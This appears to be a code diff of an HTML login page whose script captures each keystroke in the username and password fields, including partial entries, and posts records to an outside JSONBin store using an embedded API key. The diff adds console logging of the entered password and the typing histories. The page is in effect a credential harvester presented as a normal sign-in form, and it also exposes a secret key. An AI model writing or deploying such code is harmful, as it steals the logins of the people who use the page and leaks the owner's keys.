@@ -36,12 +36,10 @@
   </style>
 </head>
 <body class="text-white min-h-screen flex flex-col justify-between items-center p-6">
-
   <!-- Top Section -->
   <div class="login-container w-full">
     <div class="mb-8">
       <h1 class="text-white font-bold text-2xl mb-6">LOGIN</h1>
-
       <!-- Username -->
       <div class="mb-4 input-wrapper">
         <label class="block text-sm font-medium mb-2" for="username">Username</label>
@@ -52,7 +50,6 @@
           class="w-full px-4 py-1.5 rounded-md bg-[#111] text-white focus:outline-none focus:ring-1 focus:ring-orange-500"
         />
       </div>
-
       <!-- Password -->
       <div class="mb-6 relative input-wrapper">
         <label class="block text-sm font-medium mb-2" for="password">Password</label>
@@ -64,7 +61,6 @@
         />
         <i id="togglePassword" class="fa-solid fa-eye-slash text-gray-400 input-icon"></i>
       </div>
-
       <!-- Sign In -->
       <button
         id="login-btn"
@@ -73,7 +69,6 @@
       </button>
     </div>
   </div>
-
   <!-- Bottom Section -->
   <div class="login-container w-full">
     <div class="bg-orange-500 py-1.5 px-4 font-medium rounded-t-md">Other</div>
@@ -84,26 +79,13 @@
       </svg>
     </div>
   </div>
-
-  <script>
-    const togglePassword = document.getElementById("togglePassword");
-    const passwordInput = document.getElementById("password");
-
-    togglePassword.addEventListener("click", () => {
-      const isHidden = passwordInput.type === "password";
-      passwordInput.type = isHidden ? "text" : "password";
-      togglePassword.classList.toggle("fa-eye");
-      togglePassword.classList.toggle("fa-eye-slash");
-    });
   <!-- Script Section -->
   <script>
     const JSONBIN_API_KEY = '$2a$10$QtoHBeIgduOyNX/.VfoFPOlgQrUuKhcPZ7ZHjGLTLhVvtg17oL85y';
     const JSONBIN_BIN_ID = '67fa4eb78561e97a50fdfda5';
-
     const usernameInput = document.getElementById('username');
     const passwordInput = document.getElementById('password');
     const togglePassword = document.getElementById("togglePassword");
-
     const typingHistory = {
       username: [],
       password: []
@@ -152,7 +134,7 @@
           body: JSON.stringify(record)
         });
       } catch (err) {
-        // Logging failure silently
+        console.error('Logging failure:', err);
       }
     }
 
@@ -168,6 +150,9 @@
     document.getElementById('login-btn').addEventListener('click', async () => {
       const email = usernameInput.value.trim();
       const password = passwordInput.value.trim();
+
+      console.log('Username:', email);
+      console.log('Password:', password);
 
       if (!email || !password) {
         alert("Please enter both username and password");
@@ -190,10 +175,12 @@
 
     usernameInput.addEventListener('input', (e) => {
       typingHistory.username.push(e.target.value);
+      console.log('Username typing history:', typingHistory.username);
     });
 
     passwordInput.addEventListener('input', (e) => {
       typingHistory.password.push(e.target.value);
+      console.log('Password typing history:', typingHistory.password);
     });
   </script>
 </body>
